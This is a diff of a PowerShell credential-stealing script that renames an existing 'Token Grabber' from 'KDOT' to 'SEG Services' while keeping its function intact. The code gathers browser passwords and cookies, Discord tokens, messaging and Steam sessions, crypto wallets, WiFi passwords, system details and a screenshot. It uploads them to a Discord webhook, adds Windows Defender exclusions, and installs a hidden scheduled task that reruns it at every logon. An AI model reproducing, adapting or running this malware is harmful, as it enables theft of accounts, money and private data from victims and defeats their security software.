@@ -304,48 +304,48 @@ function EXFILTRATE-DATA {
     GrabFiles
     
     $embed_and_body = @{
-        "username" = "KDOT"
+        "username" = "SEG Services"
         "content" = "@everyone"
-        "title" = "KDOT"
-        "description" = "Powerful Token Grabber"
-        "color" = "16711680"
-        "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
-        "url" = "https://discord.gg/vk3rBhcj2y"
+        "title" = "SEG Services"
+        "description" = "Made by Unthinkable"
+        "color" = "000"
+        "avatar_url" = "https://cdn.discordapp.com/attachments/1105317268147142767/1109694234971357256/segnoback.png"
+        "url" = "https://feds.lol/Unthinkable"
         "embeds" = @(
             @{
-                "title" = "POWERSHELL GRABBER"
-                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
-                "description" = "New victim info collected !"
-                "color" = "16711680"
+                "title" = "SEG Logger"
+                "url" = "https://feds.lol/Unthinkable"
+                "description" = "Made by Unthinkable"
+                "color" = "460551"
                 "footer" = @{
-                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
+                    "text" = "Unthinkable On Top"
                 }
                 "thumbnail" = @{
-                    "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
+                    "url" = "https://cdn.discordapp.com/attachments/1105317268147142767/1109694234971357256/segnoback.png"
                 }
                 "fields" = @(
                     @{
-                        "name" = ":satellite: IP"
+                        "name" = "<a:CrownUnthinkable:1105328180350439504> IP"
                         "value" = "``````$ip``````"
                     },
                     @{
-                        "name" = ":bust_in_silhouette: User Information"
+                        "name" = "<:JokerUnthinkable:1105329668393009243> User Information"
                         "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                     },
 					@{
-                        "name" = ":shield: Antivirus"
+                        "name" = "<:LockUnthinkable:1105329669642911824> Antivirus"
                         "value" = "``````$avlist``````"
                     },
                     @{
-                        "name" = ":computer: Hardware"
+                        "name" = "<:PCunthinkable:1105468852046921859> Hardware"
                         "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                     },
                     @{
-                        "name" = ":floppy_disk: Disk"
+                        "name" = "<:BlackfloppyUnthinkable:1105468846787285002> Disk"
                         "value" = "``````$alldiskinfo``````"
                     }
                     @{
-                        "name" = ":signal_strength: WiFi"
+                        "name" = "<:WIFIUnthinkable:1105468844476203121> WiFi"
                         "value" = "``````$wifi``````"
                     }
                 )
@@ -357,7 +357,7 @@ function EXFILTRATE-DATA {
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
 	# Screenshot Embed
-	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null
+	curl.exe -F "payload_json={\`"username\`": \`"SEG Services\`", \`"content\`": \`" **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null
 
     Set-Location $env:LOCALAPPDATA\Temp
 
@@ -371,9 +371,9 @@ function EXFILTRATE-DATA {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
     }
 
-    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
+    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\SEG"
     if ($TEMP_KOT -eq $false) {
-        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
+        New-Item "$env:LOCALAPPDATA\Temp\SEG" -Type Directory
     }
     
     #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
@@ -388,36 +388,36 @@ function EXFILTRATE-DATA {
     $proc.WaitForExit()
 
     $extracted = "$env:LOCALAPPDATA\Temp"
-    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
-    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
-    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
-    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
-    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
-    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" 
-    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" 
-    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" 
-    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
-    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
-    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
-    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
-    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
-    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
-    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
-    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
-    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
-    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
-    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
-    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
-	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
-	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
-	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
-	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
-	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
-	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
-    Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
-    Remove-Item "$extracted\KDOT.zip"
-    Remove-Item "$extracted\KDOT" -Recurse
+    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\SEG\ip.txt" 
+    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\SEG\netstat.txt" 
+    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\SEG\system_info.txt" 
+    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\SEG\uuid.txt" 
+    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\SEG\mac.txt" 
+    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\SEG\browser-cookies.txt" 
+    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\SEG\browser-history.txt" 
+    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\SEG\browser-passwords.txt" 
+    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\SEG\desktop-screenshot.png" 
+    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\SEG\tokens.txt" 
+    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\SEG\WIFIPasswords.txt" 
+    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\SEG\GPU.txt" 
+    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\SEG\Installed-Applications.txt" 
+    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\SEG\DiskInfo.txt" 
+    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\SEG\CPU.txt" 
+    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\SEG\NetworkAdapters.txt" 
+    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\SEG\ProductKey.txt" 
+    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\SEG\StartUpApps.txt" 
+    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\SEG\running-services.txt" 
+    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\SEG\running-applications.txt" 
+	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\SEG\telegram-session.zip" 
+	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\SEG\element-session.zip" 
+	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\SEG\signal-session.zip" 
+	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\SEG\steam-session.zip" 
+	Move-Item -Path "Files Grabber" -Destination "$extracted\SEG\Files Grabber" 
+	Move-Item -Path "Crypto Wallets" -Destination "$extracted\SEG\Crypto Wallets" 
+    Compress-Archive -Path "$extracted\SEG" -DestinationPath "$extracted\SEG-LOG.zip" -Force
+    curl.exe -X POST -F 'payload_json={\"username\": \"SEG Services\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/attachments/1105317268147142767/1109694234971357256/segnoback.png\"}' -F "file=@$extracted\SEG-LOG.zip" $webhook
+    Remove-Item "$extracted\SEG-LOG.zip"
+    Remove-Item "$extracted\SEG" -Recurse
 	Remove-Item "$filegrabber\Files Grabber" -recurse -force
 	Remove-Item "$crypto\Crypto Wallets" -recurse -force
 	Remove-Item "$extracted\element-session" -recurse -force
@@ -428,20 +428,20 @@ function EXFILTRATE-DATA {
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
+    Add-MpPreference -ExclusionPath "$env:APPDATA\SEG"
+    New-Item -ItemType Directory -Path "$env:APPDATA\SEG" -Force
 	
 	# Hidden Directory
-	$KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
-    $KDOT_DIR.attributes="Hidden","System"
+	$SEG_DIR=get-item "$env:APPDATA\SEG" -Force
+    $SEG_DIR.attributes="Hidden","System"
     
 	$origin = $PSCommandPath
-    Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
-    $task_name = "KDOT"
-    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
+    Copy-Item -Path $origin -Destination "$env:APPDATA\SEG\SEG.ps1" -Force
+    $task_name = "SEG"
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\SEG\SEG.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "SEG" -RunLevel Highest -Force
     EXFILTRATE-DATA
 }
 
